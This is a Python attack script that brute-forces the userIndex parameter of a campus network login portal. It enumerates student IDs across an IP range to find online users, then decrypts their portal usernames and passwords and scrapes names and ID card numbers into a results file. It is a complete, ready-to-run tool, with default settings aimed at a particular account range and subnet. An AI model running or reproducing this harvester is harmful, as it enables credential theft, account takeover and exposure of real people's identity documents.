#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @Time    : 2021/10/13 2:15
# @Author  : wxy1343
# @File    : user_index_blasting.py
import argparse
import asyncio
import ipaddress
import re
import sys
from inspect import currentframe
from typing import Dict, Any, Tuple
from urllib.parse import parse_qs

import httpx

from PBEWITHMD5andDES import decrypt


async def user_index_parse(user_index: str) -> Tuple[int, str, int]:
    """
    解析user_index
    :param user_index:
    :return: (前缀,ip,账号)
    """
    prefix = int(user_index.split('5f')[0])
    ip = '.'.join([i[1::2] for i in user_index.split('5f')[1].split('2e')])
    sid = int(user_index.split('5f')[2][1::2])
    return prefix, ip, sid


async def user_index_generator(prefix: str, ip: str, sid: int) -> str:
    """
    通过ip和学号生成user_index
    :param prefix:
    :param ip:
    :param sid:
    :return: user_index
    """
    ip = '2e'.join(['3' + '3'.join(i) for i in ip.split('.')])
    sid = ''.join(['3' + '3'.join(i) for i in str(sid)])
    user_index = '5f'.join([prefix, ip, sid])
    return user_index


async def retrieve_name(var: Any) -> str:
    """
    获取变量名称
    :param var: 变量
    :return:
    """
    callers_local_vars = currentframe().f_back.f_locals.items()
    return [var_name for var_name, var_val in callers_local_vars if var_val is var][0]


async def get_user_info_by_self_url(self_url: str) -> Dict[str, Any]:
    """
    通过self_url获取user_info
    :param self_url:
    :return: user_info: Dict[str, Any]
    """
    headers = {'User-Agent': ''}
    r = await client.get(self_url, headers=headers)
    j_session_id = r.cookies.get('JSESSIONID')
    url = 'http://172.172.255.10:8080/selfservice/module/userself/web/regpassuserinfo_update.jsf'
    cookies = {'JSESSIONID': j_session_id}
    r = await client.get(url, cookies=cookies, headers=headers)
    sid, name, sex, education, card_type, card_number = re.findall('<span.*>\s*(.*?)\s*</span>', r.text, re.M)[:6]
    user_info = {}
    username = decrypt(parse_qs(self_url)['name'][0]).decode()
    password = decrypt(parse_qs(self_url)['password'][0]).decode()
    user_info['username'] = username
    user_info['password'] = password
    for i in [sid, name, sex, education, card_type, card_number]:
        user_info[await retrieve_name(i)] = i
    return user_info


async def get_online_user_info_request(user_index: str) -> httpx.Response:
    """
    获取user_index信息
    :param user_index:
    :return:
    """
    url = 'http://172.172.255.20/eportal/InterFace.do?method=getOnlineUserInfo'
    headers = {'User-Agent': ''}
    data = {'userIndex': user_index}
    try:
        r = await client.post(url, headers=headers, data=data)
    except httpx.HTTPError:
        return await get_online_user_info_request(user_index)
    r.encoding = 'utf-8'
    return r


async def blasting(prefix, sid, ip):
    """
    通过sid和ip爆破用户信息
    :param prefix:
    :param sid:
    :param ip:
    :return:
    """
    user_index = await user_index_generator(prefix, str(ip), sid)
    r = await get_online_user_info_request(user_index)
    sys.stdout.write(f'\r{sid}, {ip}')
    if r.json()['userIndex']:
        user_id, user_name, user_ip, user_mac, service = r.json()['userId'], r.json()['userName'], r.json()['userIp'], \
                                                         r.json()['userMac'], r.json()['service']
        user_info: dict = await get_user_info_by_self_url(r.json()['selfUrl'])
        text = ''
        for key, value in user_info.items():
            text += f'{key}:{value}\t'
        for i in [user_ip, user_mac, service]:
            text += f'{await retrieve_name(i)}:{i}\t'
        sys.stdout.write('\n' + text + '\n')
        text += '\n' + r.text
        with open('result.txt', 'a') as f:
            f.write(text + '\n')


async def main(prefix: str = None, ip: str = None, concurrent: int = None, sid: int = None, num: int = None):
    global client
    task_list = []
    async with httpx.AsyncClient() as client:
        for i in range(0, int(num)):
            for j in ipaddress.IPv4Network(ip):
                task_list.append(asyncio.get_event_loop().create_task(blasting(prefix, int(sid) + i, j)))
                if len(task_list) > int(concurrent):
                    await asyncio.gather(*task_list)
                    task_list = []
        await asyncio.gather(*task_list)


client: httpx.AsyncClient()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--prefix', help='userindex前缀',
                        default='6462313261353765323838303535356234353466366138356439313431383139')
    parser.add_argument('-i', '--ip', help='指定ip段', default='10.100.64.0/22')
    parser.add_argument('-c', '--concurrent', help='并发数量', default=1024)
    parser.add_argument('-s', '--sid', help='开始爆破的起始账号', default=210220001)
    parser.add_argument('-n', '--num', help='要爆破账号的数量', default=200)
    asyncio.run(main(**vars(parser.parse_args())))
